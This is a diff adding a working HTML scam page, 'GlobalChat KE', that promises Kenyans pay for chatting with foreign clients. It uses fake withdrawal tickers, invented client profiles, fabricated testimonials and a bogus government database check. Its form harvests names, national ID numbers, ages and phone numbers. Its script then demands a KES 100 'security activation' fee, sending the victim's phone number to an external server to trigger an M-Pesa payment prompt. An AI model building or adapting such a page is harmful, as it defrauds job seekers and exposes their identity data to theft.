@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>GlobalChat KE</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"/>
+<style>
+    .mpesa-bg { background: linear-gradient(90deg, #4FB848 0%, #2d8227 100%); }
+    @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+    .ticker-move { animation: ticker 30s linear infinite; white-space: nowrap; }
+    @keyframes scrollUp { 0% { transform: translateY(0); } 100% { transform: translateY(-98%); } }
+    .comment-scroll { animation: scrollUp 280s linear infinite; }
+    .comment-scroll:hover { animation-play-state: paused; }
+    .error-shake { animation: shake 0.4s; border-color: #ef4444 !important; }
+    @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-4px); } 75% { transform: translateX(4px); } }
+    input.error-field { border-color: #ef4444 !important; background-color: #fef2f2; }
+</style>
+</head>
+<body class="bg-gray-50 font-sans">
+
+<div class="bg-gray-900 text-green-400 py-1.5 overflow-hidden border-b border-green-900">
+    <div class="ticker-move flex gap-12 text-[10px] font-mono font-bold uppercase">
+        <span>● 0722***491 WITHDRAWN KES 3,450.00 (12 mins ago)</span>
+        <span>● 0791***002 WITHDRAWN KES 1,200.00 (4 mins ago)</span>
+        <span>● 0704***883 WITHDRAWN KES 5,100.00 (Just Now)</span>
+        <span>● 0726***119 WITHDRAWN KES 850.00 (31 mins ago)</span>
+        <span>● 0757***342 WITHDRAWN KES 10,200.00 (1 hour ago)</span>
+    </div>
+</div>
+
+<nav class="bg-white p-4 shadow-sm flex justify-between items-center sticky top-0 z-50">
+    <div class="flex items-center gap-2">
+        <div class="mpesa-bg text-white p-1.5 rounded shadow-lg"><i class="fas fa-handshake"></i></div>
+        <span class="text-xl font-black text-gray-900 italic uppercase tracking-tighter">GlobalChat<span class="text-green-600">KE</span></span>
+    </div>
+    <div class="text-right">
+        <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Payout Volume (24h)</p>
+        <p class="text-sm font-black text-blue-600 italic">KES 1,248,390.00</p>
+    </div>
+</nav>
+
+<section class="bg-white py-12 px-6 text-center border-b">
+    <div class="max-w-3xl mx-auto">
+        <h2 class="text-4xl font-black text-gray-900 mb-6 leading-tight">Monetize Your Kenyan Identity & Heritage</h2>
+        <p class="text-gray-600 text-lg leading-relaxed font-medium">
+            GlobalChat KE connects elite Kenyan Cultural Ambassadors with high-net-worth foreigners from the <strong>USA, UK, and EU</strong>.
+        </p>
+    </div>
+</section>
+
+<section class="px-6 py-10 bg-gray-50 max-w-6xl mx-auto">
+    <div class="flex justify-between items-center mb-8">
+        <h3 class="text-xl font-black uppercase italic tracking-tighter border-l-4 border-green-500 pl-3">Active High-Priority Clients</h3>
+        <span class="bg-green-100 text-green-600 text-[9px] px-3 py-1 rounded-full font-black animate-pulse">LIVE: 682 CLIENTS SEEKING CHAT</span>
+    </div>
+
+    <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
+        <div class="bg-white p-6 rounded-3xl shadow-sm border hover:shadow-xl transition-all flex flex-col gap-4">
+            <div class="flex items-center gap-4">
+                <img src="https://i.pravatar.cc/100?u=11" class="w-14 h-14 rounded-full border-2 border-blue-400" />
+                <div><p class="font-bold text-gray-900">Brittany Montgomery<span class="block text-[10px] text-blue-500 font-bold uppercase">Austin, Texas (USA)</span></p></div>
+            </div>
+            <p class="text-xs text-gray-600 leading-relaxed italic border-t pt-3">"I need a native to provide daily Swahili immersion and explain rural social etiquette."</p>
+            <p class="text-xs font-black text-green-600">Rate: 25 KES / Message</p>
+        </div>
+        <div class="bg-white p-6 rounded-3xl shadow-sm border hover:shadow-xl transition-all flex flex-col gap-4">
+            <div class="flex items-center gap-4">
+                <img src="https://i.pravatar.cc/100?u=12" class="w-14 h-14 rounded-full border-2 border-blue-400" />
+                <div><p class="font-bold text-gray-900">Hans Mueller<span class="block text-[10px] text-blue-500 font-bold uppercase">Berlin, Germany</span></p></div>
+            </div>
+            <p class="text-xs text-gray-600 leading-relaxed italic border-t pt-3">"Seeking local perspective on Nairobi's tech hubs and upcoming residential zones."</p>
+            <p class="text-xs font-black text-green-600">Rate: 30 KES / Message</p>
+        </div>
+        <div class="bg-white p-6 rounded-3xl shadow-sm border hover:shadow-xl transition-all flex flex-col gap-4">
+            <div class="flex items-center gap-4">
+                <img src="https://i.pravatar.cc/100?u=13" class="w-14 h-14 rounded-full border-2 border-blue-400" />
+                <div><p class="font-bold text-gray-900">Sarah Jenkins<span class="block text-[10px] text-blue-500 font-bold uppercase">London, UK</span></p></div>
+            </div>
+            <p class="text-xs text-gray-600 leading-relaxed italic border-t pt-3">"Need a local expert to recommend authentic caterers and dancers for a Diani wedding."</p>
+            <p class="text-xs font-black text-green-600">Rate: 45 KES / Message</p>
+        </div>
+        <div class="bg-white p-6 rounded-3xl shadow-sm border hover:shadow-xl transition-all flex flex-col gap-4">
+            <div class="flex items-center gap-4">
+                <img src="https://i.pravatar.cc/100?u=14" class="w-14 h-14 rounded-full border-2 border-blue-400" />
+                <div><p class="font-bold text-gray-900">Matteo Ricci<span class="block text-[10px] text-blue-500 font-bold uppercase">Milan, Italy</span></p></div>
+            </div>
+            <p class="text-xs text-gray-600 leading-relaxed italic border-t pt-3">"Looking for someone well-versed in the history of Fort Jesus and coastal trade."</p>
+            <p class="text-xs font-black text-green-600">Rate: 35 KES / Message</p>
+        </div>
+    </div>
+  </section>
+  <section class="py-12 bg-white">
+    <h5 class="text-center font-black text-gray-400 uppercase tracking-widest mb-6 italic">Ambassador Network Feedback</h5>
+    <div class="h-96 overflow-hidden border rounded-3xl bg-gray-50 relative max-w-lg mx-auto shadow-inner">
+        <div class="comment-scroll p-6 space-y-4">
+            <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
+                <p class="font-bold text-sm">Brian Omolo</p>
+                <p class="text-xs italic text-gray-600">"Hii site ni legit. At first I doubted that 100/- fee but niliamua kujaribu. Within 1 hour nishatengeneza 800/-."</p>
+            </div>
+            <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
+                <p class="font-bold text-sm">Mercy Chebet</p>
+                <p class="text-xs italic text-gray-600">"Earnings huku ni real. Deposit ya 100/- ni ya kusecure account tu, na niliipata back instantly."</p>
+            </div>
+            <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
+                <p class="font-bold text-sm">Kevin Maina</p>
+                <p class="text-xs italic text-gray-600">"Nashukuru sana GlobalChat. Fee ni kidogo sana kulingana na pesa unadraw huku. Nshatoa 4k leo!"</p>
+            </div>
+            <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
+                <p class="font-bold text-sm">Stacy Wanjiru</p><p class="text-xs italic text-gray-600">"Legitimacy confirmed! STK push ilikuja fast. Easy money."</p>
+            </div>
+            <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
+                <p class="font-bold text-sm">Derrick Mutua</p><p class="text-xs italic text-gray-600">"100/- is nothing compared to the 12,000/- I've earned this week."</p>
+            </div>
+            <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
+                <p class="font-bold text-sm">Faith Atieno</p><p class="text-xs italic text-gray-600">"Walai nilikuwa nimekata tamaa lakini hii imework. Process ni transparent."</p>
+            </div>
+            <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
+                <p class="font-bold text-sm">Collins Nyongesa</p><p class="text-xs italic text-gray-600">"Hii pesa ya activation unarudishiwa tu ukianza kazi."</p>
+            </div>
+            </div>
+    </div>
+</section>
+
+<section class="p-6 bg-white mb-10">
+    <div id="reg-box" class="max-w-lg mx-auto bg-white p-8 rounded-3xl shadow-2xl border-2 border-blue-100">
+        <h4 class="text-2xl font-black text-center mb-6 uppercase tracking-tighter">Identity Enrollment Portal</h4>
+        <div class="space-y-4">
+            <div>
+                <input type="text" id="initial-name" placeholder="Full Name (As per National ID)" class="w-full p-4 border rounded-xl bg-gray-50 outline-none focus:border-blue-400" />
+                <p id="err-initial-name" class="text-[9px] text-red-500 font-bold hidden mt-1 ml-2 uppercase">* Full name required</p>
+            </div>
+            <div>
+                <input type="text" id="initial-phone" placeholder="Phone Number (e.g. 07...)" class="w-full p-4 border rounded-xl bg-gray-50 outline-none focus:border-blue-400" />
+                <p id="err-initial-phone" class="text-[9px] text-red-500 font-bold hidden mt-1 ml-2 uppercase">* Invalid number (Use 07... or 01...)</p>
+            </div>
+            <div class="flex gap-4">
+                <div class="w-2/3">
+                    <input type="number" id="initial-id" placeholder="ID Number" class="w-full p-4 border rounded-xl bg-gray-50 outline-none focus:border-blue-400" />
+                    <p id="err-initial-id" class="text-[9px] text-red-500 font-bold hidden mt-1 ml-2 uppercase">* Min 8 digits</p>
+                </div>
+                <div class="w-1/3">
+                    <input type="number" id="initial-age" placeholder="Age" class="w-full p-4 border rounded-xl bg-gray-50 outline-none focus:border-blue-400" />
+                    <p id="err-initial-age" class="text-[9px] text-red-500 font-bold hidden mt-1 ml-2 uppercase">* Age 18+</p>
+                </div>
+            </div>
+            <div>
+                <input type="text" id="initial-job" placeholder="Current Job / Occupation" class="w-full p-4 border rounded-xl bg-gray-50 outline-none focus:border-blue-400" />
+                <p id="err-initial-job" class="text-[9px] text-red-500 font-bold hidden mt-1 ml-2 uppercase">* Field required</p>
+            </div>
+            <button onclick="validateStepOne()" class="w-full mpesa-bg text-white font-black py-5 rounded-xl text-lg shadow-xl hover:opacity-90 transition-all">
+                BEGIN VERIFICATION
+            </button>
+        </div>
+    </div>
+
+    <div id="loader" class="hidden max-w-lg mx-auto p-12 text-center bg-white rounded-3xl shadow-xl border">
+        <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+        <p class="font-bold text-blue-900 tracking-tighter uppercase text-sm">Synchronizing with Government IPRS Database...</p>
+    </div>
+
+    <div id="pay-win" class="hidden max-w-lg mx-auto p-8 rounded-3xl shadow-2xl border-4 border-green-500 text-center bg-white">
+        <i class="fas fa-id-badge text-green-500 text-5xl mb-4"></i>
+        <h5 class="text-xl font-black uppercase tracking-tighter">Pre-Approval Confirmed!</h5>
+        <div class="bg-green-50 p-6 rounded-xl border-2 border-dashed border-green-400 text-left my-6">
+            <p class="text-sm font-black text-green-900 mb-2 uppercase tracking-tight">Security & Fraud Prevention Protocol</p>
+            <p class="text-[11px] leading-relaxed text-green-800 font-medium">
+                To maintain our <strong>Tier-1 Compliance Rating</strong>, complete a <strong>one-time Security Activation of KES 100.00</strong>.
+            </p>
+        </div>
+        <div class="space-y-4">
+            <input type="text" id="mpesa-name" placeholder="Confirm M-Pesa Name" class="w-full p-4 border rounded-xl bg-gray-50 outline-none font-bold uppercase text-sm" />
+            <p id="err-mpesa-name" class="text-[9px] text-red-500 font-bold hidden mt-1 text-left ml-2 uppercase">* Name required</p>
+            <input type="text" id="mpesa-number" placeholder="Confirm M-Pesa Number" class="w-full p-4 border rounded-xl bg-gray-50 outline-none font-bold text-green-600" />
+            <p id="err-mpesa-phone" class="text-[9px] text-red-500 font-bold hidden mt-1 text-left ml-2 uppercase">* Invalid number</p>
+            <button onclick="validateAndPay()" class="mt-4 w-full mpesa-bg text-white font-black py-5 rounded-2xl text-xl shadow-lg">ACTIVATE & START EARNING</button>
+        </div>
+    </div>
+</section>
+
+<script>
+function formatNumber(phone) {
+    let clean = phone.replace(/\D/g, '');
+    if (clean.startsWith('254')) clean = '0' + clean.slice(3);
+    else if (clean.startsWith('+254')) clean = '0' + clean.slice(4);
+    return clean;
+}
+
+function validateStepOne() {
+    let hasError = false;
+    const name = document.getElementById('initial-name');
+    const phoneInput = document.getElementById('initial-phone');
+    const idNum = document.getElementById('initial-id');
+    const ageInput = document.getElementById('initial-age');
+    const job = document.getElementById('initial-job');
+
+    const errName = document.getElementById('err-initial-name');
+    const errPhone = document.getElementById('err-initial-phone');
+    const errId = document.getElementById('err-initial-id');
+    const errAge = document.getElementById('err-initial-age');
+    const errJob = document.getElementById('err-initial-job');
+
+    [name, phoneInput, idNum, ageInput, job].forEach(el => el.classList.remove('error-field', 'error-shake'));
+    [errName, errPhone, errId, errAge, errJob].forEach(el => el.classList.add('hidden'));
+
+    if (!name.value.trim()) { name.classList.add('error-field', 'error-shake'); errName.classList.remove('hidden'); hasError = true; }
+    
+    const formattedPhone = formatNumber(phoneInput.value.trim());
+    if (formattedPhone.length !== 10 || (!formattedPhone.startsWith('07') && !formattedPhone.startsWith('01'))) {
+        phoneInput.classList.add('error-field', 'error-shake'); errPhone.classList.remove('hidden'); hasError = true;
+    }
+
+    if (idNum.value.trim().length < 8) { idNum.classList.add('error-field', 'error-shake'); errId.classList.remove('hidden'); hasError = true; }
+    if (!ageInput.value || parseInt(ageInput.value) < 18) { ageInput.classList.add('error-field', 'error-shake'); errAge.classList.remove('hidden'); hasError = true; }
+    if (!job.value.trim()) { job.classList.add('error-field', 'error-shake'); errJob.classList.remove('hidden'); hasError = true; }
+
+    if (hasError) return;
+
+    document.getElementById('reg-box').classList.add('hidden');
+    document.getElementById('loader').classList.remove('hidden');
+    setTimeout(() => {
+        document.getElementById('loader').classList.add('hidden');
+        document.getElementById('pay-win').classList.remove('hidden');
+    }, 3000);
+}
+
+function validateAndPay() {
+    const name = document.getElementById('mpesa-name').value.trim();
+    const phone = document.getElementById('mpesa-number').value.trim();
+    const formatted = formatNumber(phone);
+    const errName = document.getElementById('err-mpesa-name');
+    const errPhone = document.getElementById('err-mpesa-phone');
+
+    errName.classList.add('hidden'); errPhone.classList.add('hidden');
+
+    if (!name) { errName.classList.remove('hidden'); return; }
+    if (formatted.length !== 10) { errPhone.classList.remove('hidden'); return; }
+
+    const payWin = document.getElementById('pay-win');
+    payWin.innerHTML = `<div class="p-12"><i class="fas fa-sync-alt animate-spin text-4xl text-green-500 mb-4"></i><p>Sending STK Push...</p></div>`;
+
+    fetch('https://server11-1-cfme.onrender.com/pay', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone_number: formatted, amount: 100 })
+    })
+    .then(res => res.ok ? res.json() : Promise.reject())
+    .then(() => { payWin.innerHTML = `<h5 class='text-green-600 font-bold'>STK Push Sent! Enter Pin.</h5>`; })
+    .catch(() => { payWin.innerHTML = `<h5 class='text-red-600 font-bold'>Error. Please refresh.</h5>`; });
+}
+</script>
+</body>
+</html>
